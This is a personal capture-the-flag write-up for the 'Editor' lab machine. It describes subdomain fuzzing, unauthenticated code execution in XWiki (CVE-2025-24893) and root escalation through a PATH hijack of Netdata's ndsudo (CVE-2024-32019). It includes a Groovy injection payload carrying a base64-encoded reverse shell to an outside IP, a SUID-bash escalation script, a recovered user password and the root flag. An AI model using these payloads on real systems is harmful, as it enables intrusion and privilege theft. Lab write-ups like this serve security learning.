Target : 10.129.231.23

Started off with the port scan : 22, 80, 8080

Enumerating : 80 and 8080

Adding editor.htb in /etc/hosts:

```
sudo nano /etc/hosts
10.129.231.23 editor.htb
```

*Subdomain Fuzzing using FFUF*

`ffuf -H "Host: FUZZ.editor.htb" -u http://editor.htb -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200`

got nothing

`ffuf -H "Host: FUZZ.editor.htb" -u http://editor.htb:8080 -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200`

Found : `wiki.editor.htb`

*Directory Bruteforcing using gobuster*

But haven't got anything interesting in port 80, 8080. can try with the found subdomain.

It is running `XWiki Debian 15.10.8` which is vulnerable to unauthenticated remote code execution - CVE-2025-24893

Exploit : https://www.exploit-db.com/exploits/52136

Need to modify a script to get shell access.

editor.htb:8080/xwiki

}}{{{async async=false}}{{groovy}}println(["sh", "-c", "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQ== | base64 -d | bash"].execute().text){{/groovy}}{{/async}}

%5B%22sh%22%2C%20%22-c%22%2C%20%22echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash%22%5D

Finally, this one worked.

got shell as `xwiki` user

And after looking for config files of xwiki find the password for user `oliver`

![](../Screenshot%202026-07-03%20at%209.44.35%20PM.png)

`oliver : theEd1t0rTeam99`

now, we can ssh into oliver: `ssh oliver@editor.htb`

Root Escalation:

`id` reveals this attacker belongs to netdata group

also, while looking for suid bit set binaries, found many netdata plugins with suid bit set as root

![](../Screenshot%202026-07-03%20at%2010.00.36%20PM.png)

`ndsudo` (CVE-2024-32019)

CVE-2024-32019 is a high-severity local privilege escalation vulnerability in Netdata (versions >= 1.44.0-60 < 1.45.3), caused by insecure use of the PATH variable in the ndsudo SUID binary, allowing attackers to execute arbitrary commands as root.

Exploitation:

`cd /tmp & export PATH=/tmp:$PATH`         (moving into tmp folder and adding it into path)

create a binary nvme 

```
#!/bin/bash

cp /bin/bash /tmp/suid_bash
chmod 4755 /tmp/suid_bash
cat /root/root.txt > /tmp/root.txt
```

Then simply running it, 

`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`

![](../Screenshot%202026-07-03%20at%2010.15.52%20PM.png)

`root.txt : c676e908a3a540b9df8363034272090d`

To be noted:

1. Literally had no idea on escalating local privilege through plugin.
2. also, struggled in debugging the initial exploit for unauthenticated remote code execution in xwiki, makesure to send arguments in SSTI payloads. 

["sh", "-c", "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQ== | base64 -d | bash"]